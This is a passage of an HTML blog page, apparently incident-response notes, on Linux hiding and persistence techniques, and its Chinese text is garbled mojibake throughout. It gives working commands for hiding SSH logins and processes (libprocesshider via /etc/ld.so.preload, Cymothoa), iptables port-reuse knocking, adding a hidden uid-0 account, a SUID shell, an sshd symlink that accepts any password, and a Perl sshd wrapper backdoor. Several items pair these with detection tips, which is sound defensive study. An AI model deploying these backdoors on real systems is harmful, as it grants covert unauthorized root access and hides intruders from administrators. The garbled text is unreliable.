éšè—è¿œç¨‹SSHç™»é™†è®°å½•</h3><p><strong>éšèº«ç™»å½•ç³»ç»Ÿï¼Œä¸ä¼šè¢«wã€whoã€lastç­‰æŒ‡ä»¤æ£€æµ‹åˆ°.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i</span><br></pre></td></tr></table></figure><p>ä¸è®°å½•sshå…¬é’¥åœ¨æœ¬åœ°.sshç›®å½•ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash â€“i</span><br></pre></td></tr></table></figure><h3 id="0x06-ç«¯å£å¤ç”¨"><a href="#0x06-ç«¯å£å¤ç”¨" class="headerlink" title="0x06 ç«¯å£å¤ç”¨"></a>0x06 ç«¯å£å¤ç”¨</h3><p>ç«¯å£å¤ç”¨å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/78857088">https://zhuanlan.zhihu.com/p/78857088</a></p><p>é€šè¿‡ç«¯å£å¤ç”¨æ¥è¾¾åˆ°éšè—ç«¯å£çš„ç›®çš„ï¼Œåœ¨Linuxä¸‹ï¼Œå¦‚ä½•å®ç°ç«¯å£å¤ç”¨å‘¢ï¼Ÿ</p><p>ç¬¬ä¸€ç§æ–¹å¼ï¼šé€šè¿‡SSLHåœ¨åŒä¸€ç«¯å£ä¸Šå…±äº«SSHä¸HTTPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#å®‰è£…SSLH</span><br><span class="line"> sudo apt-get install sslh</span><br><span class="line"> #é…ç½®SSLH</span><br><span class="line"> ç¼–è¾‘ SSLH é…ç½®æ–‡ä»¶ï¼š</span><br><span class="line"> sudo vi &#x2F;etc&#x2F;default&#x2F;sslh</span><br><span class="line"> 1ã€æ‰¾åˆ°ä¸‹åˆ—è¡Œï¼šRun&#x3D;no  å°†å…¶ä¿®æ”¹ä¸ºï¼šRun&#x3D;yes</span><br><span class="line"> 2ã€ä¿®æ”¹ä»¥ä¸‹è¡Œä»¥å…è®¸ SSLH åœ¨æ‰€æœ‰å¯ç”¨æ¥å£ä¸Šä¾¦å¬ç«¯å£ 443</span><br><span class="line"> DAEMON_OPTS&#x3D;&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile &#x2F;var&#x2F;run&#x2F;sslh&#x2F;sslh.pid&quot;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹å¼ï¼šåˆ©ç”¨IPTablesè¿›è¡Œç«¯å£å¤ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ç«¯å£å¤ç”¨é“¾</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># ç«¯å£å¤ç”¨è§„åˆ™</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># å¼€å¯å¼€å…³</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># å…³é—­å¼€å…³</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#39;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#å¼€å¯å¤ç”¨</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#sshä½¿ç”¨80ç«¯å£è¿›è¡Œç™»å½•</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#å…³é—­å¤ç”¨</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-4.png"></p><p>å…·ä½“æ–‡ç« è¯¦è§ï¼š<a href="https://www.freebuf.com/articles/network/137683.html">è¿œç¨‹é¥æ§ IPTables è¿›è¡Œç«¯å£å¤ç”¨</a></p><h3 id="0x07-è¿›ç¨‹éšè—"><a href="#0x07-è¿›ç¨‹éšè—" class="headerlink" title="0x07 è¿›ç¨‹éšè—"></a>0x07 è¿›ç¨‹éšè—</h3><p>ç®¡ç†å‘˜æ— æ³•é€šè¿‡ç›¸å…³å‘½ä»¤å·¥å…·æŸ¥æ‰¾åˆ°ä½ è¿è¡Œçš„è¿›ç¨‹ï¼Œä»è€Œè¾¾åˆ°éšè—ç›®çš„ï¼Œå®ç°è¿›ç¨‹éšè—ã€‚</p><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼šlibprocesshider</p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>åˆ©ç”¨ LD_PRELOAD æ¥å®ç°ç³»ç»Ÿå‡½æ•°çš„åŠ«æŒï¼Œå®ç°å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ç¨‹åºç¼–è¯‘</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gianlucaborello&#x2F;libprocesshider.git</span><br><span class="line">cd libprocesshider&#x2F; &amp;&amp; make</span><br><span class="line"># ç§»åŠ¨æ–‡ä»¶åˆ°&#x2F;usr&#x2F;local&#x2F;lib&#x2F;ç›®å½•ä¸‹</span><br><span class="line">cp libprocesshider.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;</span><br><span class="line"># æŠŠå®ƒåŠ è½½åˆ°å…¨å±€åŠ¨æ€è¿æ¥å±€</span><br><span class="line">echo &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so &gt;&gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼šè¿è¡Œ evil_script.pyï¼Œ</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-5.png"></p><p>å¦‚ä½•åœ¨Linuxä¸­å‘ç°éšè—çš„è¿›ç¨‹ï¼Œ</p><p><code>unhide</code> æ˜¯ä¸€ä¸ªå°å·§çš„ç½‘ç»œå–è¯å·¥å…·ï¼Œèƒ½å¤Ÿå‘ç°é‚£äº›å€ŸåŠ©rootkitï¼ŒLKMåŠå…¶å®ƒæŠ€æœ¯éšè—çš„è¿›ç¨‹å’ŒTCP / UDPç«¯å£ã€‚è¿™ä¸ªå·¥å…·åœ¨Linuxï¼ŒUNIXç±»ï¼ŒMS-Windowsç­‰æ“ä½œç³»ç»Ÿä¸‹éƒ½å¯ä»¥å·¥ä½œã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># ä½¿ç”¨</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>unhide proc</code>å‘ç°éšè—è¿›ç¨‹evil_script.pyï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-7.png"></p><p>ç¬¬äºŒç§æ–¹æ³•ï¼šè¿›ç¨‹æ³¨å…¥å·¥å…·linux-inject</p><p>linux-injectæ˜¯ç”¨äºå°†å…±äº«å¯¹è±¡æ³¨å…¥Linuxè¿›ç¨‹çš„å·¥å…·</p><p>githubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ç¨‹åºç¼–è¯‘</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gaffe23&#x2F;linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># æµ‹è¯•è¿›ç¨‹</span><br><span class="line">.&#x2F;sample-target</span><br><span class="line"># è¿›ç¨‹æ³¨å…¥</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>éªŒè¯è¿›ç¨‹æ³¨å…¥æˆåŠŸï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-8.png"></p><p>Cymothoaæ˜¯ä¸€æ¬¾éšç§˜çš„åé—¨å·¥å…·ã€‚å®ƒé€šè¿‡å‘ç›®æ ‡ä¸»æœºæ´»è·ƒçš„è¿›ç¨‹æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œè·å–å’ŒåŸè¿›ç¨‹ç›¸åŒçš„æƒé™ã€‚è¯¥å·¥å…·æœ€å¤§çš„ä¼˜ç‚¹å°±æ˜¯ä¸åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œä¸å®¹æ˜“è¢«å‘ç°ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½è§£å‹</span><br><span class="line">wget https:&#x2F;&#x2F;jaist.dl.sourceforge.net&#x2F;project&#x2F;cymothoa&#x2F;cymothoa-1-beta&#x2F;cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br></pre></td></tr></table></figure><h3 id="0x07-ç»“è¯­"><a href="#0x07-ç»“è¯­" class="headerlink" title="0x07 ç»“è¯­"></a>0x07 ç»“è¯­</h3><p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†Linuxä¸‹çš„å‡ ç§éšè—æŠ€æœ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ã€éšè—æƒé™ã€éšè—å†å²æ“ä½œå‘½ä»¤ã€ç«¯å£å¤ç”¨ã€è¿›ç¨‹éšè—ç­‰æ–¹é¢çš„æŠ€å·§ã€‚ä»…ä½œæŠ›ç –å¼•ç‰ä¹‹ç”¨ï¼Œæ¬¢è¿ç•™è¨€åˆ†äº«ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p>Tiny Shell</p><p>è¿™æ¬¾å·¥å…·é€šè¿‡åœ¨æºç ä¸­è®¾ç½®PROCESS_NAMEä¸ºbashï¼Œä»¥ä½¿å¾—å…¶è¿è¡Œåçš„è¿›ç¨‹åæ˜¾ç¤ºä¸ºbashã€‚ åœ¨æ¶æ„ä»£ç ä¸­é€šè¿‡è®¾ç½®å…·æœ‰è¿·æƒ‘æ€§çš„è¿›ç¨‹åå­—ï¼Œä»¥è¾¾åˆ°èº²é¿ç®¡ç†å‘˜æ£€æŸ¥çš„ç›®çš„ã€‚</p><p><a href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/sectool/138350.html">https://www.freebuf.com/sectool/138350.html</a></p><p>mount-bind</p><p>åˆ©ç”¨mount â€”bind å°†å¦å¤–ä¸€ä¸ªç›®å½•æŒ‚è½½è¦†ç›–è‡³/proc/ç›®å½•ä¸‹æŒ‡å®šè¿›ç¨‹IDçš„ç›®å½•</p><p>èŠä¸€èŠLinuxä¸‹è¿›ç¨‹éšè—çš„å¸¸è§æ‰‹æ³•åŠä¾¦æµ‹æ‰‹æ®µ <a href="https://www.anquanke.com/post/id/160843">https://www.anquanke.com/post/id/160843</a></p><p>åå…¥ä¾µä¹‹å‘ç°åé—¨åˆ©ç”¨mount-bindå°†è¿›ç¨‹å’Œç«¯å£ä¿¡æ¯éšåŒ¿ <a href="https://www.freebuf.com/articles/network/140535.html">https://www.freebuf.com/articles/network/140535.html</a></p><p><a href="https://blog.csdn.net/liuqz2009/article/details/43530201">https://blog.csdn.net/liuqz2009/article/details/43530201</a> Linux å…±äº«åº“æ³¨å…¥åé—¨</p><p>linux è¿›ç¨‹æ³¨å…¥åé—¨å·¥å…·Cymothoa</p><p>å¦‚ä½•éšè—ä½ çš„ Linux çš„å‘½ä»¤è¡Œå†å² <a href="https://www.linuxprobe.com/hidden-cmd-history.html">https://www.linuxprobe.com/hidden-cmd-history.html</a></p><p>åˆ©ç”¨sslhå®ç°ç«¯å£å¤ç”¨ <a href="https://www.bbsmax.com/A/QW5YwpWezm/">https://www.bbsmax.com/A/QW5YwpWezm/</a></p><p>è¿œç¨‹é¥æ§ IPTables è¿›è¡Œç«¯å£å¤ç”¨ <a href="https://www.freebuf.com/articles/network/137683.html">https://www.freebuf.com/articles/network/137683.html</a></p><p>Venom å¤šçº§ä»£ç†å·¥å…·</p><p>linux ä¸‹éšè—è¿›ç¨‹çš„ä¸€ç§æ–¹æ³•åŠé‡åˆ°çš„å‘</p><p><a href="https://www.jb51.net/article/147024.htm">https://www.jb51.net/article/147024.htm</a></p><p>å¦‚ä½•åœ¨ Linux/Unix/Windows ä¸­å‘ç°éšè—çš„è¿›ç¨‹å’Œç«¯å£ <a href="https://linux.cn/article-9288-1.html">https://linux.cn/article-9288-1.html</a></p><h2 id="åé—¨ç¯‡"><a href="#åé—¨ç¯‡" class="headerlink" title="åé—¨ç¯‡"></a>åé—¨ç¯‡</h2><p>æœ¬æ–‡å°†å¯¹Linuxä¸‹å¸¸è§çš„æƒé™ç»´æŒæŠ€æœ¯è¿›è¡Œè§£æï¼ŒçŸ¥å·±çŸ¥å½¼ç™¾æˆ˜ä¸æ®†ã€‚</p><p><strong>1ã€ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç </strong></p><p>æ·»åŠ æ™®é€šç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"></span><br><span class="line"># useradd -p æ–¹æ³•  &#96; &#96; æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,&quot;$()&quot;ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswdæ–¹æ³•</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -eæ–¹æ³•</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure><p>æ·»åŠ rootç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure><p>å¯ç–‘ç”¨æˆ·æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure><p><strong>2ã€SUID Shell</strong></p><p>Suid shellæ˜¯ä¸€ç§å¯ç”¨äºä»¥æ‹¥æœ‰è€…æƒé™è¿è¡Œçš„shellã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é…åˆæ™®é€šç”¨æˆ·æƒé™ä½¿ç”¨</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨guestç”¨æˆ·ç™»å½•å°±å¯ç–‘è·å–rootæƒé™ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-1.png"></p><p>å¤‡æ³¨ï¼šbash2é’ˆå¯¹suidåšäº†ä¸€äº›é˜²æŠ¤æªæ–½ï¼Œéœ€è¦ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shellã€‚å¦å¤–ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„ã€‚</p><p>æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾SUIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm &#x2F;4000 </span><br><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾ä½¿ç”¨SGIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># å–æ¶ˆsæƒé™</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure><p><strong>3ã€sshå…¬ç§é’¥å…å¯†ç™»å½•</strong></p><p>åœ¨å®¢æˆ·ç«¯ä¸Šç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼ˆ~/.ssh/authorized_keysï¼‰ï¼Œä¿ç•™ç§é’¥ã€‚å½“sshç™»å½•æ—¶ï¼Œsshç¨‹åºä¼šå‘é€ç§é’¥å»å’ŒæœåŠ¡å™¨ä¸Šçš„å…¬é’¥åšåŒ¹é…ã€‚å¦‚æœåŒ¹é…æˆåŠŸå°±å¯ä»¥ç™»å½•äº†ã€‚</p><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-2.png"></p><p>è¿›å…¥/root/.ssh/æ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¤¹çš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-3.png"></p><p>å…¶ä¸­ <code>id_rsa</code>ä¸ºç§é’¥ï¼Œ<code>id_rsa.pub</code>ä¸ºå…¬é’¥ï¼Œæ¥ä¸‹æ¥æ‰“å¼€<code>id_rsa.pub</code>ï¼Œå°†å†…å®¹å¤åˆ¶åˆ°æœåŠ¡å™¨ã€‚å°†<code>id_rsa.pub</code>çš„å†…å®¹è¿½åŠ åˆ°<code>/root/.ssh/authorized_keys</code>å†…ï¼Œé…ç½®å®Œæˆã€‚</p><p>æ’æŸ¥æŠ€å·§ï¼šæŸ¥çœ‹<code>/root/.ssh/authorized_keys</code>æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p><p><strong>4ã€è½¯è¿æ¥</strong></p><p>åœ¨sshdæœåŠ¡é…ç½®è¿è¡ŒPAMè®¤è¯çš„å‰æä¸‹ï¼ŒPAMé…ç½®æ–‡ä»¶ä¸­æ§åˆ¶æ ‡å¿—ä¸ºsufficientæ—¶åªè¦pam_rootokæ¨¡å—æ£€æµ‹uidä¸º0å³rootæƒé™å³å¯æˆåŠŸè®¤è¯ç™»é™†ã€‚é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼ï¼Œå®è´¨ä¸ŠPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å <code>/tmp/su</code> åœ¨<code>/etc/pam.d/</code>ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚: /etc/pam.d/su)ï¼Œä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯<code>auth sufficient pam_rootok.so</code>ï¼Œæ‰€ä»¥åªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯SSHä»»æ„å¯†ç ç™»é™†ï¼Œé™¤äº†suä¸­ä¹‹å¤–è¿˜æœ‰chshã€chfnåŒæ ·å¯ä»¥ã€‚</p><p>åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸€å¥è¯åé—¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œä¹‹åï¼Œä»»ä½•ä¸€å°æœºå™¨<code>ssh root@IP -p 8888</code>ï¼Œè¾“å…¥ä»»æ„å¯†ç ï¼ŒæˆåŠŸç™»å½•ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4.png"></p><p>æ’æŸ¥æŠ€å·§ï¼šè¿›ç¨‹ã€ç«¯å£éƒ½å¯ä»¥å‘ç°å¼‚å¸¸ï¼Œ kill -s 9 PID ç»“æŸè¿›ç¨‹å³å¯æ¸…é™¤åé—¨ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4-1.png"></p><p><strong>5ã€SSH wrapper</strong></p><p>é¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨/usr/bin/sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshell</p><p>ç®€å•ç‚¹å°±æ˜¯ä»sshd forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œå¹¶å¯¹è¿è¿‡æ¥çš„å®¢æˆ·ç«¯ç«¯å£è¿›è¡Œäº†åˆ¤æ–­ã€‚</p><p>æœåŠ¡ç«¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line"></span><br><span class="line">#å¦‚æœä½ æƒ³ä¿®æ”¹æºç«¯å£ï¼Œå¯ä»¥ç”¨pythonçš„structæ ‡å‡†åº“å®ç°ã€‚å…¶ä¸­x00x00LFæ˜¯19526çš„å¤§ç«¯å½¢å¼ï¼Œä¾¿äºä¼ è¾“å’Œå¤„ç†ã€‚</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#39;\x00\x00LF&#39;</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5.png"></p><p>æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line"># cat 